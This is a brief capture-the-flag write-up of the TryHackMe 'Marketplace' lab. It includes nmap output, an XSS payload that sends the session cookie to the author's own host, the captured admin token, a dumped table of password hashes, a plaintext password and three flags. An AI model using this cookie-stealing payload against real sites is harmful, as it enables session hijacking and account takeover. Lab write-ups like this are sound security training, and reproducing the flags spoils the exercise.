# The Market Place

Hi everyone Today I will start a new CTF on THM let's start by WebMap Scan

Well the nmap Scan outuped the following
```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
```

I found that there is a XSS vuln on this website but I can't exploit it
```
<script>alert(1)</script>
```

then I can still the cookie from the session
```
<script>var i=new Image;i.src="http://10.8.113.186/README.md%22+document.cookie;</script>
```

```
10.10.28.218 - - [29/Jan/2021 21:17:14] code 404, message File not found
10.10.28.218 - - [29/Jan/2021 21:17:14] "GET /README.mdtoken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MTE5NTE0NDd9.PsAaAMY7Ne515ceMIOsYSEgo-rYHq48vN3xHFcPB6Vo HTTP/1.1" 404 -
```

And Am now Admin

First Flag : THM{c37a63895910e478f28669b048c348d5}

then I used SQL to dump the passwords
```
+----+--------------------------------------------------------------+----------+-----------------+
| id | password                                                     | username | isAdministrator |
+----+--------------------------------------------------------------+----------+-----------------+
| 1  | $2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW | system   | 0               |
| 2  | $2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q | michael  | 1               |
| 3  | $2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG | jake     | 1               |
| 4  | $2b$10$D1QtVenwWbefDDrWRVKtW.2q96qFSsH/OSGq3tAapibGIII9WlVza | Anteste  | 0               |
+----+--------------------------------------------------------------+----------+-----------------+
```

jake:@b_ENXkGYUCAv3zJ

Second Flag : THM{c3648ee7af1369676e3e4b15da6dc0b4}

Third Flag : THM{d4f76179c80c0dcf46e0f8e43c9abd62}
